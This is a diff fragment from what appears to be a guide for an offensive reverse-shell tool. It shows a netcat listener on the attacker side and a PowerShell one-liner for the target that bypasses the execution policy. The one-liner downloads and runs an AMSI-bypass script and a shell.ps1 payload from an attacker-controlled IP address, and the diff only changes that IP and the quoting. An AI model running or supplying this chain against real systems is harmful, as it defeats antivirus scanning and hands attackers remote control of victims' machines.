@@ -58,7 +58,8 @@ rlwrap -cAr nc -lvp 443
 On the target machine, run the following command in CMD:
 
 ```cmd
-powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.94/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.94/shell.ps1' -UseBasicParsing).Content); Invoke-Expression $scriptContent"
+powershell -ExecutionPolicy Bypass -NoProfile -Command 'Invoke-Expression (Invoke-WebRequest -Uri "http://192.168.1.169/amsi.txt" -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.1.169/shell.ps1" -UseBasicParsing).Content); Invoke-Expression $scriptContent'
+
 
 or this one:
 
